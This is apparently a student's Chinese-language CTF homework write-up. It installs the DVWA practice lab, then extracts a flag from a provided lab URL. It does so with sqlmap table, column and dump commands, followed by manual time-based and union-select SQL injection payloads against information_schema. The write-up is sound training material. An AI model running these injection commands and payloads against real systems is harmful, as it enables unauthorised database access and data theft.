# 作业WP
题目：①部署dvwa靶场 ②要求，通过sql工具注入拿到flag  
```-----flag格式：flag{aaa_bbb}-----```

* 以下是sql（url）
http://hackattack.cn:1227/Va41IcUZk47qSxlUmgJuDe681ryyBajc/    

## 1：DVWA靶场安装
* 将下载好的文件解压，既然是要在windows下弄肯定首选打开phpstudy找到它的根目录

![Img](./FILES/Flow.md/img-20230419225137.png)


然后再虚拟机打开phpstudy打开两个服务，因为在虚拟机里安装的phpstudy


![Img](./FILES/Flow.md/img-20230419225714.png)

* 点击网站，然后左上角有一个创建网站的按钮。
* <span style="color: rgb(255, 104, 39);">注意！！！</span>创建网站的时候网站根目录一定要选择到刚刚的www文件夹下拖进去的DVWA文件，不然无法成功搭建靶场，域名啥的自己看着弄，版本我选的5.4因为我觉得它比较稳定一些。

![Img](./FILES/Flow.md/img-20230419231006.png)



保存打开网站

![Img](./FILES/Flow.md/img-20230419231143.png)


* 用户名：admin
* 密码：password
![Img](./FILES/Flow.md/img-20230419231501.png)



## 2.sql注入
打开给的靶场url查看信息，判断一下是否有sql注入在url，get请求一下输入？id=1试试看发现id的参数是可变的。

![Img](./FILES/Flow.md/img-20230419232324.png)

我们再尝试看看在url栏中get请求id=2，看看页面是否有回显，可以看到页面出现了变化.这里可能存在sql注入点，把url的地址复制下来去kali，sqlmap跑一下
![Img](./FILES/Flow.md/img-20230419232416.png)

http://hackattack.cn:1227/Va41IcUZk47qSxlUmgJuDe681ryyBajc/?id=1

* kali ---sqlmap一下
![Img](./FILES/Flow.md/img-20230419233037.png)

在sqlmap中使用命令 sqlmap -u "http://hackattack.cn:1227/Va41IcUZk47qSxlUmgJuDe681ryyBajc/?
id=1" --tables --purge 可以查看当前的所有数据库以及所有数据库里的表名

![Img](./FILES/Flow.md/img-20230419233423.png)

![Img](./FILES/Flow.md/img-20230419233447.png)

![Img](./FILES/Flow.md/img-20230419233955.png)
 由于太多了我就不一一截出来了


* 检测出数据库后，开始获取所有数据库里的表名了，看看哪些表有不对劲的。再接下来我们慢慢的看看每个数据库里的表名是什么，有没有一些比较明显可疑的表名，浏览了一圈发现可疑点一个名叫 message的数据库里发现一个叫做flag的表。这一眼丁真，肯定有问题。

![Img](./FILES/Flow.md/img-20230419233526.png)




* 使用命令 sqlmap -u "http://hackattack.cn:1227/Va41IcUZk47qSxlUmgJuDe681ryyBajc/?id=1" --columns
-T flag -D message 可以查看message这个库里的flag表里有什么字段

![Img](./FILES/Flow.md/img-20230419233720.png)


再用命令查看这个字段里的数据 sqlmap -u"http://hackattack.cn:1227/Va41IcUZk47qSxlUmgJuDe681ryyBajc/?id=1" --columns -T flag -D message--dump


![Img](./FILES/Flow.md/img-20230419233806.png)

最后看到了flag
``flag{a1a8887793acfc199182a649e905daab}``

感觉不像是真的flag看起来貌似是md5加密后的。这里使用在线MD5解密平台解密看看，最后成功解出有点不太相信是这个
![Img](./FILES/Flow.md/img-20230419235302.png)







## 方法2 sql手注
* 在后面输入 ?id=1'and sleep(10) -- dfkd 这个是让页面休息十秒钟，如果页面出现休息就证明你的语句被当作命令执行，而不是字符串了

* 再查看字段数' and 1=2 order by 1 -- dwadw(这里随便你输入任何数据)发现字段数是3

* 然后查询表名 ' and 1=2 union select 1,database(),3 -- daw 发现库名是message

* 随后查询一下这个库下面的表 ' and 1=2 union select 1,table_name,3 from information_schema.tables where table_schema='message' -- dawd

* 通过limit函数可以 知道flag字段肯定在这个库里面' and 1=2 union select 1,table_name,3 from information_schema.tables where table_schema='message' limit 0,1 -- dawd

* 查看表里的字段' and 1=2 union select 1,column_name,3 from information_schema.columns where table_schema='message' and table_name='flag' -- dwad

* ' and 1=2 union select 1,flag,3 from flag -- dwad 这里是获取表里你想要的数据





![Img](./FILES/Flow.md/img-20230420142317.png)







